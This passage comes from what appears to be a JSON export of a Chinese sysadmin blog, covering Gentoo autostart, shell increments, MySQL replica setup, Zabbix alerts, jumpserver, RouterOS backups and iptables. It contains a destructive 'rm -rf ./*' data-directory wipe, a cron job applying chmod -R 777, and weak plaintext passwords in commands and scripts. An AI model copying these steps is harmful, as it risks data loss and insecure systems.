sysinitrc::bootwait:&#x2F;sbin&#x2F;rc boot第一行:指定gentoo的默认运行级别是3，接下来两行表明gentoo的runlevel首先开始于sysinit，接着是boot。Gentoo使用字符串，而非简单的数字标记运行级，有sysinit, boot, default, nonetwork, single, shutdown六个runlevel，简单明了。 123这些runlevel对应于&#x2F;etc&#x2F;runlevels&#x2F;下的文件夹，每个文件夹中都是一些符号链接，指向&#x2F;etc&#x2F;init.d&#x2F;下的脚本。系统启动的时候就是通过执行这些软连接启动相应的进程。如果想在开机时启动哪个进程，只需要将该进程的软连接添加到对应的&#x2F;etc&#x2F;runlevels&#x2F;文件夹下即可。 启动项管理12345678910Gentoo提供了一个程序rc-update，可以很方便的管理启动项：(1)将xxx启动项添加到default运行级#rc-update add xxx default (2)从default runlevel中删除xxx服务#rc-update del xxx default(3)查看已有启动项#rc-update show Gentoo系统中(类似CentOS的rc.local文件)服务自启管理1234567负责启动脚本目录：&#x2F;etc&#x2F;local.d&#x2F; 开机启动脚本文件后缀： .start开机停止脚本文件后缀: .stop 如: 创建一个新文件 &#x2F;etc&#x2F;local.d&#x2F;HelloWorld.start:#!&#x2F;bin&#x2F;shecho &quot;Hello world!&quot; 12345678910添加执行权限chmod +x &#x2F;etc&#x2F;local.d&#x2F;HelloWorld.start配合rc-update实现开机自启动rc-update add local default通过OpenRC将已停止的服务进行启动#openrc或者明确指定启动#rc-service local start 1234注：默认情况下, 这种本地服务启动方式没有任何输出,即静默模式。 设置rc_verbose&#x3D;yes 将会显示运行的脚本即其输出#cat &#x2F;etc&#x2F;conf.d&#x2F;localrc_verbose&#x3D;yes","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"gentoo","slug":"gentoo","permalink":"https://garywu520.github.io/tags/gentoo/"},{"name":"rc.local","slug":"rc-local","permalink":"https://garywu520.github.io/tags/rc-local/"},{"name":"local.d","slug":"local-d","permalink":"https://garywu520.github.io/tags/local-d/"},{"name":"rc-update","slug":"rc-update","permalink":"https://garywu520.github.io/tags/rc-update/"},{"name":"自启动","slug":"自启动","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%90%AF%E5%8A%A8/"},{"name":"开机自启动","slug":"开机自启动","permalink":"https://garywu520.github.io/tags/%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8/"},{"name":"服务自启","slug":"服务自启","permalink":"https://garywu520.github.io/tags/%E6%9C%8D%E5%8A%A1%E8%87%AA%E5%90%AF/"}]},{"title":"Shell变量自增","slug":"Shell变量自增","date":"2018-02-14T03:54:02.000Z","updated":"2018-02-14T04:18:14.667Z","comments":true,"path":"2018/02/14/Shell变量自增/","link":"","permalink":"https://garywu520.github.io/2018/02/14/Shell%E5%8F%98%E9%87%8F%E8%87%AA%E5%A2%9E/","excerpt":"变量自增的实现方法有很多种： 12345(1) i&#x3D;&#96;expr $i + 1&#96;(2) let i+&#x3D;1(3) ((i++))(4) i&#x3D;$[$i+1](5) i&#x3D;$(( $i + 1 ))","text":"变量自增的实现方法有很多种： 12345(1) i&#x3D;&#96;expr $i + 1&#96;(2) let i+&#x3D;1(3) ((i++))(4) i&#x3D;$[$i+1](5) i&#x3D;$(( $i + 1 )) expr方式变量自增-实例测试如下：为了平台通用性建议使用expr方式 1234567#!&#x2F;bin&#x2F;bashnum&#x3D;0while [ &quot;$num&quot; -lt 5 ]do num&#x3D;&#96;expr $num + 1&#96;done 测试结果： 123456789101112131415161718[root@localhost ~]# sh -x test.sh + num&#x3D;0+ &#39;[&#39; 0 -lt 5 &#39;]&#39;++ expr 0 + 1+ num&#x3D;1+ &#39;[&#39; 1 -lt 5 &#39;]&#39;++ expr 1 + 1+ num&#x3D;2+ &#39;[&#39; 2 -lt 5 &#39;]&#39;++ expr 2 + 1+ num&#x3D;3+ &#39;[&#39; 3 -lt 5 &#39;]&#39;++ expr 3 + 1+ num&#x3D;4+ &#39;[&#39; 4 -lt 5 &#39;]&#39;++ expr 4 + 1+ num&#x3D;5+ &#39;[&#39; 5 -lt 5 &#39;]&#39; let方式12345678#!&#x2F;bin&#x2F;bashnum&#x3D;0while [ &quot;$num&quot; -lt 5 ]do let num+&#x3D;1done 测试结果: 12345678910111213[root@localhost ~]# sh -x test.sh + num&#x3D;0+ &#39;[&#39; 0 -lt 5 &#39;]&#39;+ let num+&#x3D;1+ &#39;[&#39; 1 -lt 5 &#39;]&#39;+ let num+&#x3D;1+ &#39;[&#39; 2 -lt 5 &#39;]&#39;+ let num+&#x3D;1+ &#39;[&#39; 3 -lt 5 &#39;]&#39;+ let num+&#x3D;1+ &#39;[&#39; 4 -lt 5 &#39;]&#39;+ let num+&#x3D;1+ &#39;[&#39; 5 -lt 5 &#39;]&#39; ((i++))方式12345678#!&#x2F;bin&#x2F;bashnum&#x3D;0while [ &quot;$num&quot; -lt 5 ]do ((num++))done 测试结果： 12345678910111213[root@localhost ~]# sh -x test.sh + num&#x3D;0+ &#39;[&#39; 0 -lt 5 &#39;]&#39;+ (( num++ ))+ &#39;[&#39; 1 -lt 5 &#39;]&#39;+ (( num++ ))+ &#39;[&#39; 2 -lt 5 &#39;]&#39;+ (( num++ ))+ &#39;[&#39; 3 -lt 5 &#39;]&#39;+ (( num++ ))+ &#39;[&#39; 4 -lt 5 &#39;]&#39;+ (( num++ ))+ &#39;[&#39; 5 -lt 5 &#39;]&#39; “i=$[$i+1]方式”12345678#!&#x2F;bin&#x2F;bashnum&#x3D;0while [ &quot;$num&quot; -lt 5 ]do num&#x3D;$[$num + 1]done 测试结果 12345678910111213[root@kibana-53 ~]# sh -x test.sh + num&#x3D;0+ &#39;[&#39; 0 -lt 5 &#39;]&#39;+ num&#x3D;1+ &#39;[&#39; 1 -lt 5 &#39;]&#39;+ num&#x3D;2+ &#39;[&#39; 2 -lt 5 &#39;]&#39;+ num&#x3D;3+ &#39;[&#39; 3 -lt 5 &#39;]&#39;+ num&#x3D;4+ &#39;[&#39; 4 -lt 5 &#39;]&#39;+ num&#x3D;5+ &#39;[&#39; 5 -lt 5 &#39;]&#39; “i=$(( $i + 1 ))”方式12345678#!&#x2F;bin&#x2F;bashnum&#x3D;0while [ &quot;$num&quot; -lt 5 ]do num&#x3D;$((num + 1))done 测试结果： 123456789101112+ num&#x3D;0+ &#39;[&#39; 0 -lt 5 &#39;]&#39;+ num&#x3D;1+ &#39;[&#39; 1 -lt 5 &#39;]&#39;+ num&#x3D;2+ &#39;[&#39; 2 -lt 5 &#39;]&#39;+ num&#x3D;3+ &#39;[&#39; 3 -lt 5 &#39;]&#39;+ num&#x3D;4+ &#39;[&#39; 4 -lt 5 &#39;]&#39;+ num&#x3D;5+ &#39;[&#39; 5 -lt 5 &#39;]&#39;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"expr","slug":"expr","permalink":"https://garywu520.github.io/tags/expr/"},{"name":"变量自增","slug":"变量自增","permalink":"https://garywu520.github.io/tags/%E5%8F%98%E9%87%8F%E8%87%AA%E5%A2%9E/"},{"name":"shell基础","slug":"shell基础","permalink":"https://garywu520.github.io/tags/shell%E5%9F%BA%E7%A1%80/"}]},{"title":"MySQL新增从库-数据量T级","slug":"MySQL新增从库-数据量T级","date":"2018-02-13T03:23:19.000Z","updated":"2019-02-27T03:20:59.310Z","comments":true,"path":"2018/02/13/MySQL新增从库-数据量T级/","link":"","permalink":"https://garywu520.github.io/2018/02/13/MySQL%E6%96%B0%E5%A2%9E%E4%BB%8E%E5%BA%93-%E6%95%B0%E6%8D%AE%E9%87%8FT%E7%BA%A7/","excerpt":"1实战新增从库流程，数据量T级别，耗时3-4天，特记录如下：","text":"1实战新增从库流程，数据量T级别，耗时3-4天，特记录如下： 主库准备123456789(1)备份之前,查询主库当前binlog名称和position号,并切割生成新的binlog文件 mysql&gt; show master status; mysql&gt; flush logs;(2)新增或使用原有slave同步账户和密码 grant replication slave on *.* to repl@&#39;192.168.1.%&#39; identified by &#39;123&#39;;(3)xtrabackup全备主库数据并流式压缩后rsync到从库(目的:确保在某个时间点数据一致) innobackupex --defaults-file&#x3D;&#x2F;etc&#x2F;my.cnf --user&#x3D;root --password&#x3D;123 --use-memory&#x3D;5G --stream&#x3D;xbstream &#x2F;data&#x2F;A&#x2F;backup&#x2F;mysql&#x2F;allbackup |gzip - &gt;&#x2F;data&#x2F;A&#x2F;backup&#x2F;mysql&#x2F;allbackup&#x2F;NewAll31.xbstream.gz 注：--use-memory&#x3D;5G使用多大内存, 根据实际情况修改，默认100M，慢死如牛。。。 从库流程编译部署MySQL 12345部署过程略，强调2点：(1)MySQL版本务必与主库一致(否则会报各种plugin找不到错误)(2)&#x2F;etc&#x2F;my.cnf文件需要与主库参数一致(数据目录可以不一致，这里主要说的是参数)确保使用(与主库配置一致的my.cnf文件)可以正常启动mysql即可。 全备数据恢复到MySQL数据目录 1234开启Tmux解压gzip -d NewAll31.xbstream.gz #第一次解压mkdir -p NewAll31xbstream -xC NewAll31 &lt; NewALL31.xbstream #第二次解压 初始化从库[可选] 1如果从库原先有数据，故可以首先进行初始化，MySQL5.7.x初始化命令为 mysqld ----initialize 12345678(1)并清空数据目录,否则下面步骤会报错 cd &#x2F;data&#x2F;B&#x2F;mysql&#x2F;data &amp;&amp; rm -rf .&#x2F;*(2)MySQL5.7.9重新初始化 mysqld --initialize --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;web2016&#x2F;mysql --datadir&#x3D;&#x2F;data&#x2F;B&#x2F;mysql&#x2F;data --user&#x3D;mysql(3)确保MySQL5.7.9初始化后能正常启动 &#x2F;etc&#x2F;init.d&#x2F;mysqld start 数据整合 1234567891011121314(1)停止数据库&#x2F;etc&#x2F;init.d&#x2F;mysqld stop(2)并清空（MySQL已初始化产生的文件）数据目录,否则下面步骤会报错cd &#x2F;data&#x2F;B&#x2F;mysql&#x2F;data &amp;&amp; rm -rf .&#x2F;*(3)第一次数据整合(--apply-log)innobackupex --defaults-file&#x3D;&#x2F;etc&#x2F;my.cnf --user&#x3D;root --apply-log --use-memory&#x3D;5G &#x2F;data&#x2F;B&#x2F;rsync&#x2F;NewAll31注：如果此步骤报错，很可能是因为xtrabackup版本过低，升级新版本即可(4)第二次数据整合(--copy-back)innobackupex --defaults-file&#x3D;&#x2F;etc&#x2F;my.cnf --user&#x3D;root --copy-back --use-memory&#x3D;5G &#x2F;data&#x2F;B&#x2F;rsync&#x2F;NewAll31注:第二次数据整合过程会把解压的全备文件拷贝到my.cnf(拷贝方式)写的数据目录里面 修改文件属主属组 1chown -R mysql.mysql &#x2F;data&#x2F;B&#x2F;mysql&#x2F;data #改变文件所属 启动MySQL 1&#x2F;etc&#x2F;init.d&#x2F;mysqld start 连接MySQL 1mysql -uroot -p #这里输入与登陆主库一样的用户名和密码 12345故障：如果这里用户名和密码都正确,但登陆提示错误Errir 2002 。。。。&#x2F;tmp&#x2F;mysql.sock解决方法: 编辑my.cnf 在client模块下指定我们定义的sock路径：[client]socket&#x3D;&#x2F;data&#x2F;B&#x2F;mysql&#x2F;mysql.sock重启mysql,重新登录 配置主从同步change master to 1234567891011CHANGE MASTER TO MASTER_HOST&#x3D;&#39;192.168.1.5&#39;, MASTER_USER&#x3D;&#39;repl&#39;, MASTER_PASSWORD&#x3D;&#39;repl&#39;, MASTER_PORT&#x3D;3306, MASTER_LOG_FILE&#x3D;&#39;mysql-bin.003394&#39;, MASTER_LOG_POS&#x3D;36035455; 注：如果上面的binlog文件和position号忘记，则可以在主库通过以下方式查看mysql&gt; show binary logs; #查看所有binlog文件mysql&gt; SHOW BINLOG EVENTS IN &#39;mysql-bin.003394&#39; \\G #查看具体binlog的position号 启动从库同步 12mysql&gt; start slave;mysql&gt; show slave status\\G #查看主从同步状态 故障处理 主从同步错误：1062 主键重复错误 123456789故障描述：Last_SQL_Errno: 1062Last_SQL_Error: Error &#39;Duplicate entry &#39;82427&#39; for key &#39;PRIMARY&#39;&#39; on query. Default database: &#39;smartcity&#39;. Query: &#39;INSERT INTO &#96;cpnt_info&#96; ......解决方法：stop slave; set global sql_slave_skip_counter&#x3D;1; start slave; show slave status\\G 主从同步错误: 1236 12345如果此时出现1236错误，在主库查看mysql-bin.003394这个binlog的position号这里是36035408，然后从库进行如下操作stop slave;change master to master_log_file&#x3D;&#39;mysql-bin.003394&#39;,master_log_pos&#x3D;36035408;start slave;show slave status\\G 从库优化123456中继日志(relay log)relay_log &#x3D; relay-log # 开启中继日志(从库默认启用)relay_log_info_file &#x3D; relay-log.info # 记录中继日志的文件和事件位置以及二进制的文件和事件位置relay_log_recovery &#x3D; ON # (备库)relaylog自动修复，避免网络等造成损坏，导致主从停止relay_log_purge &#x3D; ON # (备库)启动自动清除中继日志log_slave_updates &#x3D; OFF # (备库)是否将接收到的记录到本地binlog，用于级联复制","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"MySQL","slug":"MySQL","permalink":"https://garywu520.github.io/tags/MySQL/"},{"name":"Xtrabackup","slug":"Xtrabackup","permalink":"https://garywu520.github.io/tags/Xtrabackup/"},{"name":"innobackupex","slug":"innobackupex","permalink":"https://garywu520.github.io/tags/innobackupex/"},{"name":"新增从库","slug":"新增从库","permalink":"https://garywu520.github.io/tags/%E6%96%B0%E5%A2%9E%E4%BB%8E%E5%BA%93/"},{"name":"2002","slug":"2002","permalink":"https://garywu520.github.io/tags/2002/"},{"name":"1236","slug":"1236","permalink":"https://garywu520.github.io/tags/1236/"},{"name":"1062","slug":"1062","permalink":"https://garywu520.github.io/tags/1062/"}]},{"title":"zabbix自定义shell实现邮件告警","slug":"zabbix自定义shell实现邮件告警","date":"2018-02-11T08:59:51.000Z","updated":"2018-02-12T08:09:01.419Z","comments":true,"path":"2018/02/11/zabbix自定义shell实现邮件告警/","link":"","permalink":"https://garywu520.github.io/2018/02/11/zabbix%E8%87%AA%E5%AE%9A%E4%B9%89shell%E5%AE%9E%E7%8E%B0%E9%82%AE%E4%BB%B6%E5%91%8A%E8%AD%A6/","excerpt":"安装postfix参考: Postfix邮件发送服务 1注: 如果postfix安装后没有mail命令,则需要安装mailx 邮件发送测试 1echo &quot;aaa&quot;|mail -s &#39;aaa&#39; xxxx@qq.com","text":"安装postfix参考: Postfix邮件发送服务 1注: 如果postfix安装后没有mail命令,则需要安装mailx 邮件发送测试 1echo &quot;aaa&quot;|mail -s &#39;aaa&#39; xxxx@qq.com 邮件发送Shell脚本1vim &#x2F;usr&#x2F;local&#x2F;zabbix&#x2F;scripts&#x2F;postfix_mail.sh 123456789#!&#x2F;bin&#x2F;bashmessages&#x3D;&#96;echo $3 | tr &#39;\\r\\n&#39; &#39;\\n&#39;&#96;subject&#x3D;&#96;echo $2 | tr &#39;\\r\\n&#39; &#39;\\n&#39;&#96;logdir&#x3D;&quot;&#x2F;var&#x2F;lib&#x2F;zabbix&#x2F;scripts&#x2F;alertscripts&quot;echo &quot;$&#123;messages&#125;&quot; | mail -aFrom:zabbix@xxx.com -s &quot;$&#123;subject&#125;&quot; xxx@xxx.com $1注：发送邮件命令中 xxx@xxx.com 和 $1都是邮件地址,写两个原因是避免出错,暂无日志输出 测试Shell邮件发送脚本 123&#x2F;usr&#x2F;local&#x2F;zabbix&#x2F;scripts&#x2F;send_mail.sh xxxxx@qq.com &#39;aaa&#39; &#39;ccc&#39;检查邮箱可以看到邮件 设置zabbix执行脚本的路径123vim &#x2F;usr&#x2F;local&#x2F;zabbix&#x2F;etc&#x2F;zabbix_server.confAlertScriptsPath&#x3D;&#x2F;usr&#x2F;local&#x2F;zabbix&#x2F;scripts #把上面的脚本放这个目录下 1给这个目录设置755执行权限和zabbix用户属组权限 配置”报警媒介类型”类型12345678管理 -- 报警媒介类型 -- 添加名称: bj_Email_Shell类型: scripts&#x2F;脚本脚本名称: postfix_mail.sh (按实际填写,否则会出现错误)Script参数： &#123;ALERT.SENDTO&#125; &#123;ALERT.SUBJECT&#125; &#123;ALERT.MESSAGE&#125; 对用户添加报警方式1234管理 -- 用户 -- 张三 -- 报警媒介 --添加类型: 选择刚定义的bj_Email_Shell收件人: zhangsan@mail.com时间范围: 1-7,00:00-23:59; 测试123&#x2F;etc&#x2F;init.d&#x2F;zabbix_agentd stop等待邮件收取","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"mailx","slug":"mailx","permalink":"https://garywu520.github.io/tags/mailx/"}]},{"title":"jumpserver连接登陆时间隔天的问题","slug":"jumpserver连接登陆时间隔天的问题","date":"2018-02-11T08:25:27.000Z","updated":"2018-02-11T08:31:12.787Z","comments":true,"path":"2018/02/11/jumpserver连接登陆时间隔天的问题/","link":"","permalink":"https://garywu520.github.io/2018/02/11/jumpserver%E8%BF%9E%E6%8E%A5%E7%99%BB%E9%99%86%E6%97%B6%E9%97%B4%E9%9A%94%E5%A4%A9%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"故障: 创建tty日志文件失败,请修改目录”XXXX”权限1创建tty日志文件失败,请修改目录&#x2F;opt&#x2F;jumpserver&#x2F;logs&#x2F;tty&#x2F;2018xxxx权限","text":"故障: 创建tty日志文件失败,请修改目录”XXXX”权限1创建tty日志文件失败,请修改目录&#x2F;opt&#x2F;jumpserver&#x2F;logs&#x2F;tty&#x2F;2018xxxx权限 故障原因1Jumpserver连接跨天导致权限错误, 如: 23:00-00:30期间登录跳板机 解决方案1234567891011可以通过创建计划任务，定时修改日志权限vim date.sh 内容如下mkdir &#x2F;opt&#x2F;jumpserver&#x2F;logs&#x2F;tty&#x2F;$(date +%Y%m%d)chmod -R 777 &#x2F;opt&#x2F;jumpserver&#x2F;logs&#x2F;tty&#x2F;$(date +%Y%m%d)crontab -e 添加计划任务,每天0时1分创建或者修改目录1 0 * * * sh &#x2F;root&#x2F;date.shcrontab -l 查看计划任务1 0 * * * sh &#x2F;root&#x2F;date.sh","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"jumpserver","slug":"jumpserver","permalink":"https://garywu520.github.io/tags/jumpserver/"}]},{"title":"ssh方式备份RouterOS配置","slug":"ssh方式备份RouterOS配置","date":"2018-02-10T10:12:18.000Z","updated":"2018-08-10T10:22:55.296Z","comments":true,"path":"2018/02/10/ssh方式备份RouterOS配置/","link":"","permalink":"https://garywu520.github.io/2018/02/10/ssh%E6%96%B9%E5%BC%8F%E5%A4%87%E4%BB%BDRouterOS%E9%85%8D%E7%BD%AE/","excerpt":"**脚本逻辑: ** 123(1) expect脚本编写并执行RouterOS配置备份(2) 备份的配置文件下载(3) 邮件判断并携带附件发送","text":"**脚本逻辑: ** 123(1) expect脚本编写并执行RouterOS配置备份(2) 备份的配置文件下载(3) 邮件判断并携带附件发送 注意事项： 12(1) RouterOS需启用FTP服务，限定内网IP段访问(2) 客户端需要安装lftp命令 脚本备份频率： 1每天一次备份(导出后立即清理RouterOS上的备份文件,不保留) 脚本详情： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#!&#x2F;bin&#x2F;bashHOSTNAME&#x3D;&quot;xx.xx.xx.xx&quot;PORT&#x3D;&quot;xxx&quot;USER&#x3D;&quot;xxxx&quot;PASS&#x3D;&quot;xxxxx&quot;TODAY&#x3D;$(date +%F)FILENAME1&#x3D;&quot;RouterOS_cmmbak_$TODAY&quot;FILENAME2&#x3D;&quot;RouterOS_rosbak_$TODAY&quot;BAK&#x3D;&quot;&#x2F;tmp&#x2F;RouterOS_bak.expect&quot;BAK_DIR&#x3D;&quot;&#x2F;Ros_BAK&quot;EMAIL&#x3D;&quot;xxx@xxx.com&quot;#判断if [ ! -f $BAK ];thentouch $BAKelse &gt;$BAKfiif [ ! -d $BAK_DIR ];thenmkdir -p $BAK_DIRelse cd $BAK_DIR &amp;&amp; rm -f .&#x2F;*fi#创建expect脚本cat &gt; $BAK &lt;&lt; EOF set timeout -1spawn ssh -p$PORT $USER@$HOSTNAMEmatch_max 100000expect -exact &quot;password:&quot;send -- &quot;$PASS\\r&quot;sleep 1expect &quot; &gt; &quot;send -- &quot;&#x2F;export file&#x3D;$FILENAME1\\r&quot;expect &quot; &gt; &quot;send -- &quot;&#x2F;system backup save name&#x3D;$FILENAME2\\r&quot;expect &quot; &gt; &quot;send -- &quot;quit\\r&quot;expect eofEOF#执行expect脚本&#x2F;usr&#x2F;bin&#x2F;expect -f $BAKsleep 2rm -f $BAK#下载配置cd $BAK_DIRecho &quot;set xfer:clobber on get $&#123;FILENAME1&#125;.rscrm $&#123;FILENAME1&#125;.rscget $&#123;FILENAME2&#125;.backuprm $&#123;FILENAME2&#125;.backup&quot; |lftp -u $USER,$PASS $HOSTNAME#邮件函数定义省略...File1&#x3D;&quot;&#x2F;Ros_BAK&#x2F;RouterOS_cmmbak_2018-08-10.rsc&quot;File2&#x3D;&quot;&#x2F;Ros_BAK&#x2F;RouterOS_rosbak_2018-08-10.backup&quot;if [ -f $File2 ];then routeros_successelse routeros_fialedfi 注 1set xfer:clobber on #表示覆盖下载 12345expect &quot; &gt; &quot; #捕捉Ros控制台符号send -- &quot;&#x2F;export file&#x3D;$FILENAME1\\r&quot; #备份成*.rsc格式expect &quot; &gt; &quot;send -- &quot;&#x2F;system backup save name&#x3D;$FILENAME2\\r&quot; #备份成*.backup格式","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"RouterOS","slug":"RouterOS","permalink":"https://garywu520.github.io/tags/RouterOS/"},{"name":"ssh","slug":"ssh","permalink":"https://garywu520.github.io/tags/ssh/"},{"name":"expect","slug":"expect","permalink":"https://garywu520.github.io/tags/expect/"},{"name":"Ros","slug":"Ros","permalink":"https://garywu520.github.io/tags/Ros/"},{"name":"FTP","slug":"FTP","permalink":"https://garywu520.github.io/tags/FTP/"}]},{"title":"iptables网络防火墙","slug":"iptables网络防火墙","date":"2018-02-10T01:36:25.000Z","updated":"2018-04-08T07:41:11.532Z","comments":true,"path":"2018/02/10/iptables网络防火墙/","link":"","permalink":"https://garywu520.github.io/2018/02/10/iptables%E7%BD%91%E7%BB%9C%E9%98%B2%E7%81%AB%E5%A2%99/","excerpt":"123官网：http:&#x2F;&#x2F;www.netfilter.org&#x2F;iptables由Netfilter内核态组件实现防火墙功能, 包过滤功能强大，使用灵活不适用于大并发场景，适用于并发量相对较少(500左右并发)的访问场景","text":"123官网：http:&#x2F;&#x2F;www.netfilter.org&#x2F;iptables由Netfilter内核态组件实现防火墙功能, 包过滤功能强大，使用灵活不适用于大并发场景，适用于并发量相对较少(500左右并发)的访问场景 12345iptables -V #查看iptables版本iptables主要工作在OSI七层的3层(IP), 也支持2层(但基本不需要对2层控制)iptables也可以支持7层控制(重新编译内核或通过iptables+squid结合来实现)还可以使用iptables+Quagga(开源)实现OSPF和BGP的功能 概念理解添加iptables规则时需要指定规则所属的链和链所属的表 Netfilter 表(tables) 链(chains) 规则(policy) 一栋楼 楼里的房子 房子里的柜子 柜子里的衣服,摆放规则 iptables数据包处理流程12- 按顺序依次检查，匹配即停止（LOG策略例外）- 若找不到相匹配的规则，则按该链的默认策略处理 12345678910根据规则链的划分原则，不同的链处理时机是比较固定的，因此规则链之间的应用顺序取决于数据包的流向，具体表现如下。-- 入站数据流向：来自外部的数据包到达防火墙后，首先被PREROUTING链处理（是否修改数据包地址等），然后进行路由选择（判断该数据包发往何处）；如果数据包地址是防火墙本机（入internet用户访问网关的web服务端口），那么内核将其传递给（filter表的）INPUT链进行处理（决定是否允许通过等），通过以后再给系统上层的应用（入httpd）进行响应。-- 转发数据流向：来自外部的数据包到达防火墙后，首先被PREROUTING链处理（是否修改数据包地址等），然后进行路由选择；如果数据包的目标地址是其他外部地址（如局域网用户通过网关访问QQ服务器），则内核将其传送给FORWARD链进行处理（允许转发或者拦截，丢弃），最后交给POSTROUTING链（是否修改数据包地址等）进行处理。-- 出站数据流向：防火墙本机向外部地址发送的数据包（如在防火墙主机中测试公网DNS服务时），首先被OUTPUT链处理，然后进行路由选择，再交给POSTROUTING链（是否修改数据包地址等）进行处理 防火墙4个表(tables)5个链(chains)默认包括4个规则表： 1234567raw表：确定是否对该数据包进行状态跟踪；对应iptable_raw，表内包含两个链：OUTPUT、PREROUTINGmangle表：为数据包的TOS（服务类型）、TTL（生命周期）值，或者为数据包设置Mark标记，以实现流量整形、策略路由等高级应用。其对应iptable_mangle，表内包含五个链：PREROUTING、POSTROUTING、INPUT、OUTPUT、FORWARDnat表：修改数据包中的源、目标IP地址或端口；其对应的模块为iptable_nat，表内包括三个链：PREROUTING、POSTROUTING、OUTPUTfilter表：确定是否放行该数据包（过滤）；其对应的内核模块为iptable_filter，表内包含三个链：INPUT、FORWARD、OUTPUT 默认包括5种规则链:1234567INPUT：处理入站数据包OUTPUT：处理出站数据包FORWARD：处理转发数据包POSTROUTING链：在进行路由选择后处理数据包（对数据链进行源地址修改转换）PREROUTING链：在进行路由选择前处理数据包（做目标地址转换）注：INPUT、OUTPUT链主要用在“主机型防火墙”中，即主要针对服务器本机进行保护的防火墙,比如服务器；而FORWARD、PREROUTING、POSTROUTING链多用在“网络型防火墙”中,比如RouterOS路由器等。 4个规则表之间的应用顺序1raw表 --&gt; mangle表 --&gt;nat表 --&gt;filter表 iptables命令1234567iptables -L 查看现有iptables规则iptables -nL 以数字的形式显示iptables规则iptables -nL -t nat 指定查看哪张表的配置,默认是查看filter表, -t 即tablesiptables -nL --line-number 给iptables规则显示行号iptables -F 清除&#x2F;初始化默认iptables规则(注:默认删除的是filter表的规则)iptables -F -t nat 清除&#x2F;初始化指定表的规则iptables -nL (服务停止情况下执行此命令会清空其默认规则) 12345678910111213iptables -t filter -A INPUT -p tcp --dport 22 -j ACCEPT-t filter 指定表-A 指定表中的链chains剩余的部分就是具体的规则-p 指定协议--dport 指定访问这台服务器的目标端口--sport 指定访问这台服务器的源端口-s 指定访问本机的源IP地址-j ACCEPT允许&#x2F;DROP丢弃&#x2F;REJECT拒绝(丢弃比拒绝从安全思想来说更安全)iptables -nL --line-number -v #查询数据包匹配计数iptables -Z 清除数据包匹配计数iptables -X 删除防火墙所有自定义链 初始化防火墙步骤1234567891011&#x2F;etc&#x2F;sysconfig&#x2F;iptables #初始化保存配置文件初始化操作配置iptables -F 清除所有规则，不会处理默认的规则iptables -X 清除用户自定义的链iptables -Z 清除链的计数器清零（数据包计数器与数据包字节计数器）iptables -nL -v 显示计数器信息iptables -A INPUT -s 10.0.0.0&#x2F;24 -i eth1 -p tcp --dport 22 -j ACCEPT 先把自己允许(别限制太细)iptables -A INPUT -i lo -j ACCEPT 允许本地环回接口iptables -P INPUT DROP 配置默认拒绝 测试：禁止10.0.0.10访问我本地10.0.0.8的80端口12345iptables -t filter -A INPUT -i eth0 -p tcp --dport 80 -d 10.0.0.8 -s 10.0.0.10 -j DROP-A 添加-i 指定从哪个端口进来-d 指定本地(目标)IP地址-s 指定源IP地址(可以是单个ip,也可以是整个地址段10.0.0.0&#x2F;24) 12345678#模拟禁用整个地址段(也包括目标IP地址),此时目标服务器也无法ssh连接了iptables -t filter -A INPUT -p tcp --dport 22 -d 10.0.0.0&#x2F;24 -s 10.0.0.10 -j DROP#解决方法：物理机插入一条策略iptables -t filter -I INPUT -p tcp --dport 22 -s 10.0.0.8 -j ACCEPT-I 插入(插入后会优先执行此规则)注：如果使用-A参数添加后，仍然无法ssh连接目标服务器,因为默认执行了第一条策略 删除规则12iptables -nL --line-numberiptable -D INPUT 2 修改现有规则1234iptables -nL --line-numberiptables -R INPUT 2 -s 10.0.0.253 -p tcp --dport 80 -j ACCEPT-R 链名称 规则号 测试:除了10.1.0.0/24网段可以连接10.0.0.8服务器22端口，其他网段都禁止123前提：filter表需要默认允许,否则该方法会被拒方法：iptables -t filter -A INPUT ！ -s 10.1.0.0&#x2F;24 -d 10.0.0.8 -p tcp --dport 22 -j REJECT 匹配多个端口1234567【匹配连续多个端口】禁止访问本地10000-20000端口iptables -t filter -A INPUT -p tcp --dport 10000:20000 -j DROP【匹配不连续端口，需要使用multiport模块】禁止任何访问目标服务器的22和80端口iptables -t filter -A INPUT -p tcp -m multiport --dport 22,80 -j DROP 匹配多个IP或IP段12屏蔽多个IP地址或多个地址段iptables -t filter -A INPUT -s 1.1.1.1,1.0.0.1,192.168.10.0&#x2F;24 -j DROP 禁止Ping资料参考: [Ping回显类型](http://www.cnitblog.com/yang55xiaoguang/articles/59581.ht 123456789101112131415161718192021主要关注以下类型类型:8 Echo request——回显请求（Ping请求）类型:0 Echo Reply——回显应答（Ping应答）禁止ping策略原则: iptables服务器是ping命令的发起者或是接受者作为发起者时：input链： 禁止icmp-type 0 iptables -A INPUT -i eth0 -p icmp --icmp-type 0 -j DROPoutput链： 禁止icmp-type 8 iptables -A OUTPUT -o eth0 -p icmp --icmp-type 8 -j DROP作为接受者时：input链： 禁止icmp-type 8 iptables -A INPUT -i eth0 -p icmp 